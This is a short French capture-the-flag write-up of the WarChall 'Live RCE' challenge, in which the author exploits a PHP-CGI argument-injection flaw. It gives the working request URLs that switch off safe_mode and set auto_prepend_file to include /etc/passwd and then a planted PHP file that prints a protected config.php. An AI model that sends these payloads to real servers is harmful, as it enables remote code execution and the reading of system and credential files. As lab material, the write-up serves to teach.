# Live - RCE
"Live RCE" fait référence à une "Remote Code Execution" (exécution de code à distance) en direct

## Objectif

Imprime le contenu de `/home/level/20_live_rce/config.php` 

## Solution du Challenge

La première chose utile que j'ai faite a été de tomber sur une vulnérabilité PHP-CGI sur Google. J'ai rapidement découvert qu'une bonne façon de tester cette vulnérabilité était d'utiliser :

```
http://rce.warchall.net/?-s
```

et de vérifier si le code source est affiché. C'était le cas ! Maintenant, je sais que je dois voir ce qu'il y a dans `/home/level/20_live_rce/config.php`. Maintenant, je savais sur quoi chercher sur Google. Après un certain temps, j'ai trouvé ce vecteur d'attaque. Il est censé me permettre d'inclure un fichier à distance ou local. En faisant :

```
https://rce.warchall.net/index.php?-dsafe_mode=Off+-ddisable_functions=NULL+-dallow_url_fopen=On+-dallow_url_include=On+-dauto_prepend_file=http:://google.com/robots.txt
```

cela n'a pas fonctionné, mais ceci a marché :

```
https://rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/etc/passwd
```

Ensuite, je savais que j'avais accès à SSH et je pouvais mettre un script PHP de base dans un fichier à :

>`
/var/tmp/rce.txt
`

Code PHP basique pour /var/tmp/s.txt :

```php
<?php
echo file_get_contents("/home/level/20_live_rce/config.php");
```

Ensuite, je savais que je devais exécuter :

```
https://rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/rce.txt
```

À première vue, cela n'a pas fonctionné. Rien d'autre que le contenu de index.php n'était affiché dans le navigateur. Puis, je me suis souvenu que si cela réussissait, cela imprimerait quelque chose comme :

```php
<?php
// whatever
?>
```

>Cela ne peut être vu que si vous affichez le code source. Bingo. C'était là


J'ai testé le mot que j'ai vu dans le code source comme le drapeau et il a dit que le défi était résolu.

